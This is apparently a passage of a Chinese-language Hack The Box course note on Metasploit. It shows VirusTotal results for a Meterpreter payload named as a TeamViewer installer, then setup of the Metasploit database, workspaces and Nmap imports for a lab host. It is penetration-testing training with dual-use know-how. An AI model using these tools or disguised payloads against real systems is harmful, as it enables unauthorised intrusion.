VirusTotal"></a>无国界医生 - VirusTotal</h4><p> 无国界医生 - VirusTotal</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload TeamViewerInstall.exe...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130</span><br><span class="line">[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9</span><br><span class="line">[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1651750343</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">==================================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version                                                         Result                                                     Update</span><br><span class="line"> ---------             --------  -------                                                         ------                                                     ------</span><br><span class="line"> ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> APEX                  true      6.288                                                           Malicious                                                  20220504</span><br><span class="line"> AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Acronis               true      1.2.0.108                                                       suspicious                                                 20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505</span><br><span class="line"> Alibaba               false     0.3.0.5                                                                                                                    20190527</span><br><span class="line"> Antiy-AVL             false     3.0                                                                                                                        20220505</span><br><span class="line"> Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505</span><br><span class="line"> Baidu                 false     1.0.0.2                                                                                                                    20190318</span><br><span class="line"> BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428</span><br><span class="line"> Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505</span><br><span class="line"> CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505</span><br><span class="line"> CMC                   false     2.10.2019.1                                                                                                                20211026</span><br><span class="line"> ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505</span><br><span class="line"> Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505</span><br><span class="line"> CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418</span><br><span class="line"> Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505</span><br><span class="line"> Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505</span><br><span class="line"> Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505</span><br><span class="line"> DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505</span><br><span class="line"> ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505</span><br><span class="line"> Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503</span><br><span class="line"> Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505</span><br><span class="line"> F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505</span><br><span class="line"> FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505</span><br><span class="line"> Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505</span><br><span class="line"> GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505</span><br><span class="line"> Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505</span><br><span class="line"> Jiangmin              false     16.0.100                                                                                                                   20220504</span><br><span class="line"> K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                                                                                              20220505</span><br><span class="line"> Lionic                false     7.5                                                                                                                        20220505</span><br><span class="line"> MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505</span><br><span class="line"> Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505</span><br><span class="line"> MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505</span><br><span class="line"> McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505</span><br><span class="line"> McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505</span><br><span class="line"> NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505</span><br><span class="line"> Paloalto              false     0.9.0.1003                                                                                                                 20220505</span><br><span class="line"> Panda                 false     4.6.4.2                                                                                                                    20220504</span><br><span class="line"> Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505</span><br><span class="line"> SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430</span><br><span class="line"> Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415</span><br><span class="line"> SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330</span><br><span class="line"> Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505</span><br><span class="line"> Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505</span><br><span class="line"> TACHYON               false     2022-05-05.02                                                                                                              20220505</span><br><span class="line"> Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505</span><br><span class="line"> TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> VBA32                 false     5.0.0                                                                                                                      20220505</span><br><span class="line"> ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504</span><br><span class="line"> VirIT                 false     9.5.188                                                                                                                    20220504</span><br><span class="line"> Webroot               false     1.0.0.403                                                                                                                  20220505</span><br><span class="line"> Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428</span><br><span class="line"> Zillya                false     2.0.0.4625                                                                                                                 20220505</span><br><span class="line"> ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Zoner                 false     2.2.2.0                                                                                                                    20220504</span><br><span class="line"> tehtris               false     v0.1.2                                                                                                                     20220505</span><br></pre></td></tr></table></figure><p>正如预期的那样，我们在野外遇到的大多数反病毒产品仍会检测到此有效负载，因此我们将不得不使用本模块范围之外的其他方法来规避 AV。</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><hr><p><code>Databases</code>in<code>msfconsole</code>用于跟踪您的结果。毫无疑问，在更复杂的机器评估期间，更不用说整个网络了，由于搜索结果、入口点、检测到的问题、发现的凭据等的绝对数量，事情会变得有点模糊和复杂。</p><p>这就是数据库发挥作用的地方。<code>Msfconsole</code>内置了对 PostgreSQL 数据库系统的支持。有了它，我们可以直接、快速、轻松地访问扫描结果，并增加了与第三方工具一起导入和导出结果的能力。数据库条目也可用于直接使用现有的调查结果配置漏洞利用模块参数。</p><hr><h2 id="设置数据库"><a href="#设置数据库" class="headerlink" title="设置数据库"></a>设置数据库</h2><p>首先，我们必须确保 PostgreSQL 服务器在我们的主机上启动并运行。为此，请输入以下命令：</p><h4 id="PostgreSQL-状态"><a href="#PostgreSQL-状态" class="headerlink" title="PostgreSQL 状态"></a>PostgreSQL 状态</h4><p> PostgreSQL 状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo service postgresql status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago</span><br><span class="line">    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2147 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure><h4 id="启动-PostgreSQL"><a href="#启动-PostgreSQL" class="headerlink" title="启动 PostgreSQL"></a>启动 PostgreSQL</h4><p> 启动 PostgreSQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo systemctl start postgresql</span><br></pre></td></tr></table></figure><p>启动 PostgreSQL 后，我们需要创建并初始化 MSF 数据库<code>msfdb init</code>。</p><h4 id="MSF-启动数据库"><a href="#MSF-启动数据库" class="headerlink" title="MSF - 启动数据库"></a>MSF - 启动数据库</h4><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">rake aborted!</span><br><span class="line">NoMethodError: undefined method `without&#x27; for #&lt;Bundler::Settings:0x000055dddcf8cba8&gt;</span><br><span class="line">Did you mean? with_options</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果 Metasploit 不是最新的，有时会发生错误。这种导致错误的差异可能有多种原因。首先，通常它有助于再次更新 Metasploit ( <code>apt update</code>) 来解决这个问题。然后我们可以尝试重新初始化 MSF 数据库。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br></pre></td></tr></table></figure><p>如果初始化被跳过并且 Metasploit 告诉我们数据库已经配置好，我们可以重新检查数据库的状态。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago</span><br><span class="line">    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2476 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br><span class="line"></span><br><span class="line">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line">postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line"></span><br><span class="line">UID          PID    PPID  C STIME TTY      STAT   TIME CMD</span><br><span class="line">postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con</span><br><span class="line"></span><br><span class="line">[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)</span><br></pre></td></tr></table></figure><p>如果这个错误没有出现，这通常发生在全新安装 Metasploit 之后，那么我们将在初始化数据库时看到以下内容：</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[+] Starting database</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br></pre></td></tr></table></figure><p>数据库初始化完成后，我们可以<code>msfconsole</code>同时启动并连接到创建的数据库。</p><h4 id="MSF-连接到启动的数据库"><a href="#MSF-连接到启动的数据库" class="headerlink" title="MSF - 连接到启动的数据库"></a>MSF - 连接到启动的数据库</h4><p> MSF - 连接到启动的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb run</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line">         .                                         .</span><br><span class="line"> .</span><br><span class="line"></span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o</span><br><span class="line">       &#x27;   dB&#x27;                     BBP</span><br><span class="line">    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB</span><br><span class="line">   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB</span><br><span class="line">  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB</span><br><span class="line"></span><br><span class="line">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span><br><span class="line">          .                  .                  dB&#x27; dBP    dB&#x27;.BP</span><br><span class="line">                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP</span><br><span class="line"></span><br><span class="line">                                                                    .</span><br><span class="line">                .</span><br><span class="line">        o                  To boldly go where no</span><br><span class="line">                            shell has gone before</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.39-dev                          ]</span><br><span class="line">+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]</span><br><span class="line">+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf6&gt;</span><br></pre></td></tr></table></figure><p>但是，如果我们已经配置了数据库并且无法将密码更改为 MSF 用户名，请继续执行以下命令：</p><h4 id="MSF-重新启动数据库"><a href="#MSF-重新启动数据库" class="headerlink" title="MSF - 重新启动数据库"></a>MSF - 重新启动数据库</h4><p> MSF - 重新启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfdb reinit</span><br><span class="line">vnswer77@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/</span><br><span class="line">vnswer77@htb[/htb]$ sudo service postgresql restart</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: PostgreSQL.</span><br></pre></td></tr></table></figure><p>现在，我们可以开始了。它还<code>msfconsole</code>为数据库提供集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。</p><h4 id="MSF-数据库选项"><a href="#MSF-数据库选项" class="headerlink" title="MSF - 数据库选项"></a>MSF - 数据库选项</h4><p> MSF - 数据库选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help database</span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure><hr><h2 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h2><p>在数据库的帮助下，我们可以管理我们分析过的许多不同的类别和主机。或者，我们使用 Metasploit 与之交互的有关它们的信息。这些数据库可以导出和导入。当我们有大量的主机列表、战利品、注释和这些主机的存储漏洞时，这尤其有用。确认数据库连接成功后，我们就可以组织我们的<code>Workspaces</code>.</p><h4 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h4><p>我们可以<code>Workspaces</code>像考虑项目中的文件夹一样考虑。我们可以按 IP、子网、网络或域隔离不同的扫描结果、主机和提取的信息。</p><p>要查看当前工作区列表，请使用<code>workspace</code>命令。在命令后添加<code>-a</code>or开关，后跟工作空间的名称，将把工作空间或该工作空间添加到数据库中。<code>-d``add``delete</code></p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">* default</span><br></pre></td></tr></table></figure><p>请注意，默认工作区已<code>default</code>根据<code>*</code>符号命名并且当前正在使用中。键入<code>workspace [name]</code>命令以切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -a Target_1</span><br><span class="line"></span><br><span class="line">[*] Added workspace: Target_1</span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace Target_1 </span><br><span class="line"></span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">  default</span><br><span class="line">* Target_1</span><br></pre></td></tr></table></figure><p>要查看我们还可以使用 Workspaces 做什么，我们可以使用<code>workspace -h</code>与 Workspaces 相关的帮助菜单的命令。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r     Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure><hr><h2 id="导入扫描结果"><a href="#导入扫描结果" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h2><p>接下来，让我们假设我们想要将<code>Nmap scan</code>主机的一个导入到我们的数据库的工作区中，以便更好地了解目标。我们可以<code>db_import</code>为此使用命令。导入完成后，我们可以使用<code>hosts</code>和<code>services</code>命令检查数据库中主机信息的存在。请注意，<code>.xml</code>文件类型首选<code>db_import</code>.</p><h4 id="存储-Nmap-扫描"><a href="#存储-Nmap-扫描" class="headerlink" title="存储 Nmap 扫描"></a>存储 Nmap 扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat Target.nmap</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds</span><br></pre></td></tr></table></figure><h4 id="导入扫描结果-1"><a href="#导入扫描结果-1" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 